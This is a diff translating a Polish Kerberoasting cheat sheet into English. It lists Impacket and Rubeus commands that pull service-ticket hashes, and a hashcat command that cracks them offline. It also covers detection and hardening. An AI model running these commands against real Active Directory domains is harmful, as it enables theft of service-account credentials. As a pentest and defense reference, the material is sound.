@@ -12,24 +12,24 @@ author: "core"
 # Kerberoasting
 
 ## TL;DR
-Każdy uwierzytelniony użytkownik może poprosić o bilet usługi (TGS) dla konta z SPN. Bilet jest szyfrowany hashem hasła konta usługowego → offline crack. Konta serwisowe często mają słabe, stałe hasła.
+Any authenticated user can request a service ticket (TGS) for an account with an SPN. The ticket is encrypted with the service account's password hash → offline crack. Service accounts often have weak, static passwords.
 
-## Wymagania / Kontekst
-- Dowolne poświadczenia domenowe (nawet low-priv).
-- Konto docelowe ma ustawiony SPN (`servicePrincipalName`).
+## Requirements / Context
+- Any domain credentials (even low-priv).
+- The target account has an SPN set (`servicePrincipalName`).
 
-## Komendy
+## Commands
 ```bash
-# Z Linuksa (Impacket) – wypisz kerberoastable i zgarnij hashe
+# From Linux (Impacket) – list kerberoastable and grab hashes
 impacket-GetUserSPNs -request -dc-ip 10.10.10.10 corp.local/user:'Pass' -outputfile hashes.txt
 
-# Targetowany na jedno konto
+# Targeted at one account
 impacket-GetUserSPNs -request-user svc_sql -dc-ip 10.10.10.10 corp.local/user:'Pass'
 ```
 ```powershell
-# Z Windows (Rubeus)
+# From Windows (Rubeus)
 Rubeus.exe kerberoast /outfile:hashes.txt
-# tylko słabe (RC4)
+# only weak ones (RC4)
 Rubeus.exe kerberoast /rc4opsec
 ```
 
@@ -39,21 +39,21 @@ hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule
 # 13100 = Kerberos 5 TGS-REP etype 23 (RC4)
 ```
 
-## Wykrywanie (Blue Team)
+## Detection (Blue Team)
 ```text
-Event 4769 (TGS request) z:
- - Ticket Encryption Type 0x17 (RC4)  <- podejrzane w środowisku AES
- - jeden użytkownik żądający wielu SPN w krótkim czasie
+Event 4769 (TGS request) with:
+ - Ticket Encryption Type 0x17 (RC4)  <- suspicious in an AES environment
+ - one user requesting many SPNs in a short time
 ```
-- Honeypot: konto z SPN i długim hasłem — każde 4769 na nie = alert.
+- Honeypot: an account with an SPN and a long password — any 4769 against it = alert.
 
-## Mitygacja / Hardening
-- **gMSA / dMSA** (hasła 120+ znaków, auto-rotacja).
-- Wymuś AES na kontach usługowych (wyłącz RC4), długie hasła (25+).
-- Minimalizuj konta z SPN; usuń nieużywane SPN.
+## Mitigation / Hardening
+- **gMSA / dMSA** (120+ char passwords, auto-rotation).
+- Enforce AES on service accounts (disable RC4), long passwords (25+).
+- Minimize accounts with SPNs; remove unused SPNs.
 
-## Uwagi / Pułapki
-- `/rc4opsec` bierze tylko konta wciąż dopuszczające RC4 (ciszej niż masowy roast).
+## Notes / Pitfalls
+- `/rc4opsec` targets only accounts that still allow RC4 (quieter than a mass roast).
 
-## Źródła
+## Sources
 - [Rubeus](https://github.com/GhostPack/Rubeus) · [MITRE T1558.003](https://attack.mitre.org/techniques/T1558/003/)
